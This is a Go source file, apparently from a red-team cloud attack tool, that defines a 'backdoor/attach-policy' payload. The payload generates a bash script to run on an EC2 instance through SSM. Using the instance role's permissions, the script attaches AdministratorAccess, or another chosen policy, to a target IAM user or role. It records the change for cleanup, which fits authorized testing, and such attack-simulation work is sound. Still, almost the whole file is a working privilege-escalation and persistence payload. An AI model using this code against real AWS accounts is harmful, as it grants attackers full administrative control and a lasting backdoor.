// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package ssm

import (
	"fmt"
	"strings"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
)

// BackdoorAttachPolicyPayload attaches a policy to an IAM user or role by running
// an AWS CLI command directly on the target EC2 instance via SSM.
type BackdoorAttachPolicyPayload struct{}

func init() {
	_ = payloads.Register(&BackdoorAttachPolicyPayload{})
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach a policy to an IAM user or role using the instance role's IAM permissions"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceSSM,
		payloads.TagLanguageBash,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ARN",
			Description: "IAM user or role name/ARN to attach policy to (auto-detects type from ARN, tries both if plain name)",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "ARN of policy to attach",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_ARN"] == "" {
		return fmt.Errorf("TARGET_ARN is required for backdoor/attach-policy payload")
	}
	return nil
}

func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	targetARN := options["TARGET_ARN"]
	principalName, principalType := parsePrincipalARN(targetARN)
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	var attachCommand string
	switch principalType {
	case "role":
		attachCommand = fmt.Sprintf("aws iam attach-role-policy --role-name %s --policy-arn %s", principalName, policyArn)
	case "user":
		attachCommand = fmt.Sprintf("aws iam attach-user-policy --user-name %s --policy-arn %s", principalName, policyArn)
	default:
		// Plain name — try user first, fall back to role
		attachCommand = fmt.Sprintf(
			`aws iam attach-user-policy --user-name %s --policy-arn %s 2>/dev/null || \
    aws iam attach-role-policy --role-name %s --policy-arn %s`,
			principalName, policyArn, principalName, policyArn)
	}

	script := fmt.Sprintf(`echo "Pathrunner: attach-policy"
echo "Target: %s"
echo "Policy: %s"

%s

if [ $? -eq 0 ]; then
    echo "SUCCESS: Policy %s attached to %s"
else
    echo "FAILED: Could not attach policy (exit code: $?)"
fi
`, principalName, policyArn, attachCommand, policyArn, principalName)

	return script, nil
}

func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	return result, nil
}

// ReportSideEffects returns the policy attachment as a tracked modification.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	principalName, principalType := parsePrincipalARN(options["TARGET_ARN"])
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	policyName := "AdministratorAccess"
	if idx := strings.LastIndex(policyArn, "/"); idx != -1 {
		policyName = policyArn[idx+1:]
	}

	cleanupMethod := "iam:DetachUserPolicy"
	if principalType == "role" {
		cleanupMethod = "iam:DetachRolePolicy"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", principalName, policyName),
			ARN:           policyArn,
			CleanupMethod: cleanupMethod,
			Metadata: map[string]string{
				"principal_type": principalType,
				"principal_name": principalName,
				"policy_arn":     policyArn,
			},
		},
	}
}

// parsePrincipalARN extracts the principal name and type from an ARN or plain name.
// Returns an empty principalType for plain names so the caller can try both user and role.
func parsePrincipalARN(input string) (name string, principalType string) {
	if strings.HasPrefix(input, "arn:") {
		if idx := strings.Index(input, ":role/"); idx != -1 {
			return input[idx+len(":role/"):], "role"
		}
		if idx := strings.Index(input, ":user/"); idx != -1 {
			return input[idx+len(":user/"):], "user"
		}
	}
	return input, ""
}
